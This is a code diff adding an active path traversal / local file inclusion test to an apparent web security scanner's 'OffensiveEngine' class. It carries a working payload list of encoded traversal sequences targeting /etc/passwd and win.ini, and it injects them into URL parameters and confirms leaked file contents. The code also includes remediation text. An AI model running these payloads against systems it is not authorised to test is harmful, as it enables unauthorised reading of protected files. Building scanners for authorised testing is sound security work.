@@ -358,16 +358,108 @@ class OffensiveEngine:
         return results
 
     # ── Orchestrate the offensive phase ──────────────────────────
+    # ── Path traversal / LFI (active, confirmed file read) ───────
+    async def test_path_traversal(self, urls: list) -> list:
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import httpx
+
+        param_urls = [u for u in urls if "?" in u and "=" in u][:30]
+        if not param_urls:
+            await self.log("No parameterized URLs to test for path traversal", "info")
+            return []
+
+        await self.log(f"Testing {len(param_urls)} endpoints for path traversal / LFI", "info")
+
+        NIX = "etc/passwd"
+        WIN = "windows/win.ini"
+        depths = ["../", "../../", "../../../", "../../../../",
+                  "../../../../../", "../../../../../../", "../../../../../../../"]
+        payloads = []
+        for d in depths:
+            payloads.append(d + NIX)
+            payloads.append(d + WIN)
+        payloads += [
+            "/etc/passwd",
+            "....//....//....//....//etc/passwd",
+            "..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "../../../../etc/passwd%00",
+        ]
+
+        passwd_re = re.compile(r"root:.*?:0:0:", re.MULTILINE)
+        win_re = re.compile(r"\[(extensions|fonts|mci extensions)\]", re.IGNORECASE)
+
+        findings = []
+        seen = set()
+        budget = 350
+
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
+            for u in param_urls:
+                parsed = urlparse(u)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                for pname in list(params.keys())[:3]:
+                    key = (parsed.netloc, parsed.path, pname)
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    hit = None
+                    for pl in payloads:
+                        if budget <= 0:
+                            break
+                        budget -= 1
+                        mutated = dict(params)
+                        mutated[pname] = [pl]
+                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
+                        try:
+                            r = await c.get(target)
+                        except Exception:
+                            continue
+                        body = r.text or ""
+                        m = passwd_re.search(body)
+                        if m:
+                            hit = ("*nix /etc/passwd", pl, "critical", 9.1, m.group(0))
+                            break
+                        if "win.ini" in pl.lower():
+                            wm = win_re.search(body)
+                            if wm:
+                                hit = ("Windows win.ini", pl, "high", 7.5, wm.group(0))
+                                break
+                    if hit:
+                        label, pl, sev, cvss, snippet = hit
+                        findings.append({"param": pname, "payload": pl, "url": u, "file": label})
+                        await self.add_finding(
+                            title=f"Path Traversal / LFI: {pname}",
+                            severity=sev,
+                            description=(f"Parameter '{pname}' is vulnerable to path traversal. Injecting a "
+                                         f"traversal sequence returned the contents of a protected system "
+                                         f"file ({label}), confirming arbitrary file read."),
+                            evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\nLeaked: {snippet[:200]}",
+                            cvss_score=cvss,
+                            remediation=("Reject path separators and traversal sequences in file parameters. "
+                                         "Resolve the canonical path and confirm it stays within an allowed "
+                                         "base directory. Prefer an allowlist of identifiers mapped "
+                                         "server-side to filenames."),
+                        )
+                    if budget <= 0:
+                        await self.log("Path traversal request budget reached; stopping early", "warn")
+                        break
+
+        await self.log(f"Path traversal testing complete: {len(findings)} confirmed",
+                       "success" if findings else "info")
+        return findings
+
     async def run_offensive(self, base_url: str, extra_wordlists: list = None) -> dict:
         await self.log(f"⚔ Offensive engine engaged against {base_url}", "info")
         urls = await self.crawl(base_url)
 
         # Run injection classes concurrently where safe
-        sqli, xss, dast, auth, disco = await asyncio.gather(
+        sqli, xss, dast, auth, trav, disco = await asyncio.gather(
             self.test_sqli(urls),
             self.test_xss(urls),
             self.nuclei_dast(urls),
             self.test_auth(base_url, urls),
+            self.test_path_traversal(urls),
             self.content_discovery(base_url, extra_wordlists),
             return_exceptions=True,
         )
@@ -381,8 +473,9 @@ class OffensiveEngine:
             "xss": _safe(xss),
             "dast": _safe(dast),
             "auth": _safe(auth),
+            "traversal": _safe(trav),
             "content": _safe(disco),
         }
-        total = sum(len(_safe(v)) for v in (sqli, xss, dast, auth))
+        total = sum(len(_safe(v)) for v in (sqli, xss, dast, auth, trav))
         await self.log(f"⚔ Offensive engine complete: {total} injection/access findings across {len(urls)} URLs", "success")
         return result
